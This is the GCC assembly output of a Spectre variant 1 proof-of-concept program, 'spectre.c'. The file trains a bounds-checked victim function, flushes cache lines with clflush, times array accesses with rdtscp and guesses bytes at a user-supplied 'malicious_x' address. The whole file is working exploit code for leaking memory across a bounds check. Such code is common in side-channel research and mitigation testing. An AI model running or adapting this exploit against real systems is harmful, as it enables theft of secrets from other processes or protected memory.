	.file	"spectre.c"
	.text
	.globl	check
	.type	check, @function
check:
.LFB5689:
	.cfi_startproc
	movl	array1_size(%rip), %eax
	cltq
	cmpq	%rdi, %rax
	seta	%al
	movzbl	%al, %eax
	ret
	.cfi_endproc
.LFE5689:
	.size	check, .-check
	.globl	test
	.type	test, @function
test:
.LFB5690:
	.cfi_startproc
	movl	array1_size(%rip), %eax
	cltq
	cmpq	%rdi, %rax
	jbe	.L2
	leaq	array1(%rip), %rax
	cmpb	%sil, (%rax,%rdi)
	je	.L4
.L2:
	ret
.L4:
	movzbl	%sil, %esi
	leaq	array2(%rip), %rax
	movzbl	(%rax,%rsi), %eax
	andb	%al, temp(%rip)
	jmp	.L2
	.cfi_endproc
.LFE5690:
	.size	test, .-test
	.globl	victim_function
	.type	victim_function, @function
victim_function:
.LFB5691:
	.cfi_startproc
	movzbl	check_value(%rip), %esi
	call	test
	ret
	.cfi_endproc
.LFE5691:
	.size	victim_function, .-victim_function
	.globl	readMemoryByte
	.type	readMemoryByte, @function
readMemoryByte:
.LFB5692:
	.cfi_startproc
	endbr64
	pushq	%r15
	.cfi_def_cfa_offset 16
	.cfi_offset 15, -16
	pushq	%r14
	.cfi_def_cfa_offset 24
	.cfi_offset 14, -24
	pushq	%r13
	.cfi_def_cfa_offset 32
	.cfi_offset 13, -32
	pushq	%r12
	.cfi_def_cfa_offset 40
	.cfi_offset 12, -40
	pushq	%rbp
	.cfi_def_cfa_offset 48
	.cfi_offset 6, -48
	pushq	%rbx
	.cfi_def_cfa_offset 56
	.cfi_offset 3, -56
	subq	$56, %rsp
	.cfi_def_cfa_offset 112
	movq	%rdi, 8(%rsp)
	movq	%rsi, 16(%rsp)
	movq	%rdx, 24(%rsp)
	movq	%fs:40, %rax
	movq	%rax, 40(%rsp)
	xorl	%eax, %eax
	movl	$0, 32(%rsp)
	leaq	results.0(%rip), %rax
	leaq	1024(%rax), %rdx
.L7:
	movl	$0, (%rax)
	addq	$4, %rax
	cmpq	%rax, %rdx
	jne	.L7
	movl	$999, 4(%rsp)
	leaq	array2(%rip), %r15
	leaq	results.0(%rip), %r14
	jmp	.L8
.L10:
	movslq	%ebx, %rax
	imulq	$715827883, %rax, %rax
	shrq	$32, %rax
	movl	%ebx, %edx
	sarl	$31, %edx
	subl	%edx, %eax
	leal	(%rax,%rax,2), %edx
	addl	%edx, %edx
	movl	%ebx, %eax
	subl	%edx, %eax
	subl	$1, %eax
	movw	$0, %ax
	cltq
	movq	%rax, %rdi
	shrq	$16, %rdi
	orq	%rax, %rdi
	andq	%r12, %rdi
	xorq	%rbp, %rdi
	call	victim_function
	subl	$1, %ebx
	cmpl	$-1, %ebx
	je	.L31
.L12:
	clflush	array1_size(%rip)
	movl	$0, 36(%rsp)
	movl	36(%rsp), %eax
	cmpl	$99, %eax
	jg	.L10
.L11:
	movl	36(%rsp), %eax
	addl	$1, %eax
	movl	%eax, 36(%rsp)
	movl	36(%rsp), %eax
	cmpl	$99, %eax
	jle	.L11
	jmp	.L10
.L31:
	rdtscp
	movq	%rax, %rsi
	movl	%ecx, 32(%rsp)
	salq	$32, %rdx
	orq	%rdx, %rsi
	movslq	(%rsp), %rax
	movzbl	(%r15,%rax), %eax
	rdtscp
	movl	%ecx, 32(%rsp)
	salq	$32, %rdx
	orq	%rdx, %rax
	subq	%rsi, %rax
	cmpq	$50, %rax
	ja	.L13
	addl	$1, (%r14,%r13,4)
.L13:
	addq	$1, %r13
	cmpq	$256, %r13
	je	.L32
.L14:
	movl	%r13d, (%rsp)
	movb	%r13b, check_value(%rip)
	movl	$29, %ebx
	jmp	.L12
.L32:
	movl	$1, %edx
	movl	$0, %eax
	jmp	.L15
.L21:
	movl	%eax, %ebx
	movl	%ecx, %eax
.L16:
	addq	$1, %rdx
.L15:
	movl	%edx, %ecx
	cmpq	$256, %rdx
	je	.L33
	testl	%eax, %eax
	js	.L21
	movl	(%r14,%rdx,4), %esi
	movslq	%eax, %rdi
	cmpl	(%r14,%rdi,4), %esi
	jge	.L22
	testl	%ebx, %ebx
	js	.L23
	movslq	%ebx, %rdi
	cmpl	(%r14,%rdi,4), %esi
	cmovge	%ecx, %ebx
	jmp	.L16
.L22:
	movl	%eax, %ebx
	movl	%ecx, %eax
	jmp	.L16
.L23:
	movl	%ecx, %ebx
	jmp	.L16
.L33:
	movslq	%ebx, %rdx
	movl	(%r14,%rdx,4), %ecx
	movslq	%eax, %rdx
	movl	(%r14,%rdx,4), %edx
	leal	4(%rcx,%rcx), %esi
	cmpl	%edx, %esi
	jl	.L18
	testl	%ecx, %ecx
	jne	.L24
	cmpl	$2, %edx
	je	.L18
.L24:
	subl	$1, 4(%rsp)
	je	.L18
.L8:
	movl	4(%rsp), %eax
	leaq	array2(%rip), %rdx
.L9:
	clflush	(%rdx)
	addq	$512, %rdx
	leaq	131072+array2(%rip), %rsi
	cmpq	%rdx, %rsi
	jne	.L9
	movl	array1_size(%rip), %ecx
	cltd
	idivl	%ecx
	movslq	%edx, %rbp
	movl	$0, %r13d
	movq	8(%rsp), %r12
	xorq	%rbp, %r12
	jmp	.L14
.L18:
	leaq	results.0(%rip), %rcx
	movl	results.0(%rip), %edx
	xorl	32(%rsp), %edx
	movl	%edx, results.0(%rip)
	movq	16(%rsp), %rsi
	movb	%al, (%rsi)
	cltq
	movl	(%rcx,%rax,4), %eax
	movq	24(%rsp), %rdx
	movl	%eax, (%rdx)
	movb	%bl, 1(%rsi)
	movslq	%ebx, %rbx
	movl	(%rcx,%rbx,4), %eax
	movl	%eax, 4(%rdx)
	movq	40(%rsp), %rax
	subq	%fs:40, %rax
	jne	.L34
	addq	$56, %rsp
	.cfi_remember_state
	.cfi_def_cfa_offset 56
	popq	%rbx
	.cfi_def_cfa_offset 48
	popq	%rbp
	.cfi_def_cfa_offset 40
	popq	%r12
	.cfi_def_cfa_offset 32
	popq	%r13
	.cfi_def_cfa_offset 24
	popq	%r14
	.cfi_def_cfa_offset 16
	popq	%r15
	.cfi_def_cfa_offset 8
	ret
.L34:
	.cfi_restore_state
	call	__stack_chk_fail@PLT
	.cfi_endproc
.LFE5692:
	.size	readMemoryByte, .-readMemoryByte
	.section	.rodata.str1.1,"aMS",@progbits,1
.LC0:
	.string	"Success"
.LC1:
	.string	"Unclear"
	.section	.rodata.str1.8,"aMS",@progbits,1
	.align 8
.LC2:
	.string	"Putting '%s' in memory, address %p\n"
	.section	.rodata.str1.1
.LC3:
	.string	"%p"
.LC4:
	.string	"%d"
	.section	.rodata.str1.8
	.align 8
.LC5:
	.string	"Trying malicious_x = %p, len = %d\n"
	.section	.rodata.str1.1
.LC6:
	.string	"Reading %d bytes:\n"
	.section	.rodata.str1.8
	.align 8
.LC7:
	.string	"Reading at malicious_x = %p secc= %c ..."
	.section	.rodata.str1.1
.LC8:
	.string	"%s: "
.LC9:
	.string	"0x%02X='%c' score=%d "
	.section	.rodata.str1.8
	.align 8
.LC10:
	.string	"(second best: 0x%02X='%c' score=%d)"
	.section	.rodata.str1.1
.LC11:
	.string	"\n"
.LC12:
	.string	"addr = %llx, pid = %d\n"
	.text
	.globl	main
	.type	main, @function
main:
.LFB5693:
	.cfi_startproc
	endbr64
	pushq	%r15
	.cfi_def_cfa_offset 16
	.cfi_offset 15, -16
	pushq	%r14
	.cfi_def_cfa_offset 24
	.cfi_offset 14, -24
	pushq	%r13
	.cfi_def_cfa_offset 32
	.cfi_offset 13, -32
	pushq	%r12
	.cfi_def_cfa_offset 40
	.cfi_offset 12, -40
	pushq	%rbp
	.cfi_def_cfa_offset 48
	.cfi_offset 6, -48
	pushq	%rbx
	.cfi_def_cfa_offset 56
	.cfi_offset 3, -56
	subq	$72, %rsp
	.cfi_def_cfa_offset 128
	movl	%edi, 4(%rsp)
	movq	%rsi, 8(%rsp)
	movq	%fs:40, %rax
	movq	%rax, 56(%rsp)
	xorl	%eax, %eax
.L36:
	movq	stdin(%rip), %rdi
	call	getc@PLT
	cmpb	$114, %al
	je	.L55
	cmpb	$10, %al
	je	.L36
	cmpb	$105, %al
	jne	.L47
	movl	$0, %eax
	call	getpid@PLT
	movl	%eax, %ecx
	leaq	33+check(%rip), %rdx
	leaq	.LC12(%rip), %rsi
	movl	$1, %edi
	movl	$0, %eax
	call	__printf_chk@PLT
	jmp	.L36
.L55:
	movq	secret(%rip), %rdx
	movq	%rdx, %rcx
	leaq	.LC2(%rip), %rsi
	movl	$1, %edi
	movl	$0, %eax
	call	__printf_chk@PLT
	movq	secret(%rip), %rdi
	movq	%rdi, %rax
	leaq	array1(%rip), %rbx
	subq	%rbx, %rax
	movq	%rax, 32(%rsp)
	call	strlen@PLT
	movl	%eax, 28(%rsp)
	movb	$1, check_value(%rip)
	leaq	array2(%rip), %rax
	leaq	131072(%rax), %rdx
.L38:
	movb	$1, (%rax)
	addq	$1, %rax
	cmpq	%rdx, %rax
	jne	.L38
	cmpl	$3, 4(%rsp)
	je	.L56
.L39:
	movl	28(%rsp), %edx
	leaq	.LC6(%rip), %rsi
	movl	$1, %edi
	movl	$0, %eax
	call	__printf_chk@PLT
	movl	28(%rsp), %eax
	subl	$1, %eax
	movl	%eax, 28(%rsp)
	js	.L36
	movl	$0, %ebp
	leaq	.LC7(%rip), %r15
	leaq	.LC0(%rip), %r14
	leaq	.LC1(%rip), %r13
	jmp	.L45
.L56:
	leaq	32(%rsp), %rdx
	movq	8(%rsp), %rbx
	movq	8(%rbx), %rdi
	leaq	.LC3(%rip), %rsi
	movl	$0, %eax
	call	__isoc99_sscanf@PLT
	leaq	array1(%rip), %rax
	subq	%rax, 32(%rsp)
	leaq	28(%rsp), %rdx
	movq	16(%rbx), %rdi
	leaq	.LC4(%rip), %rsi
	movl	$0, %eax
	call	__isoc99_sscanf@PLT
	movl	28(%rsp), %ecx
	movq	32(%rsp), %rdx
	leaq	.LC5(%rip), %rsi
	movl	$1, %edi
	movl	$0, %eax
	call	__printf_chk@PLT
	jmp	.L39
.L43:
	leaq	.LC11(%rip), %rsi
	movl	$1, %edi
	movl	$0, %eax
	call	__printf_chk@PLT
	movl	28(%rsp), %eax
	subl	$1, %eax
	movl	%eax, 28(%rsp)
	addq	$1, %rbp
	testl	%eax, %eax
	js	.L36
.L45:
	movq	secret(%rip), %rax
	movsbl	(%rax,%rbp), %ecx
	movq	32(%rsp), %rdx
	movq	%r15, %rsi
	movl	$1, %edi
	movl	$0, %eax
	call	__printf_chk@PLT
	movq	32(%rsp), %rdi
	leaq	1(%rdi), %rax
	movq	%rax, 32(%rsp)
	leaq	44(%rsp), %rdx
	leaq	54(%rsp), %rsi
	call	readMemoryByte
	movl	44(%rsp), %r12d
	movl	48(%rsp), %ebx
	leal	(%rbx,%rbx), %eax
	cmpl	%eax, %r12d
	movq	%r13, %rdx
	cmovge	%r14, %rdx
	leaq	.LC8(%rip), %rsi
	movl	$1, %edi
	movl	$0, %eax
	call	__printf_chk@PLT
	movzbl	54(%rsp), %edx
	leal	-32(%rdx), %eax
	cmpb	$94, %al
	movl	$63, %ecx
	cmovbe	%edx, %ecx
	movzbl	%cl, %ecx
	movzbl	%dl, %edx
	movl	%r12d, %r8d
	leaq	.LC9(%rip), %rsi
	movl	$1, %edi
	movl	$0, %eax
	call	__printf_chk@PLT
	testl	%ebx, %ebx
	jle	.L43
	movzbl	55(%rsp), %edx
	leal	-32(%rdx), %eax
	cmpb	$94, %al
	movl	$63, %ecx
	cmovbe	%edx, %ecx
	movzbl	%cl, %ecx
	movzbl	%dl, %edx
	movl	%ebx, %r8d
	leaq	.LC10(%rip), %rsi
	movl	$1, %edi
	movl	$0, %eax
	call	__printf_chk@PLT
	jmp	.L43
.L47:
	movq	56(%rsp), %rax
	subq	%fs:40, %rax
	jne	.L57
	movl	$0, %eax
	addq	$72, %rsp
	.cfi_remember_state
	.cfi_def_cfa_offset 56
	popq	%rbx
	.cfi_def_cfa_offset 48
	popq	%rbp
	.cfi_def_cfa_offset 40
	popq	%r12
	.cfi_def_cfa_offset 32
	popq	%r13
	.cfi_def_cfa_offset 24
	popq	%r14
	.cfi_def_cfa_offset 16
	popq	%r15
	.cfi_def_cfa_offset 8
	ret
.L57:
	.cfi_restore_state
	call	__stack_chk_fail@PLT
	.cfi_endproc
.LFE5693:
	.size	main, .-main
	.local	results.0
	.comm	results.0,1024,32
	.ident	"GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0"
	.section	.note.GNU-stack,"",@progbits
	.section	.note.gnu.property,"a"
	.align 8
	.long	1f - 0f
	.long	4f - 1f
	.long	5
0:
	.string	"GNU"
1:
	.align 8
	.long	0xc0000002
	.long	3f - 2f
2:
	.long	0x3
3:
	.align 8
4:
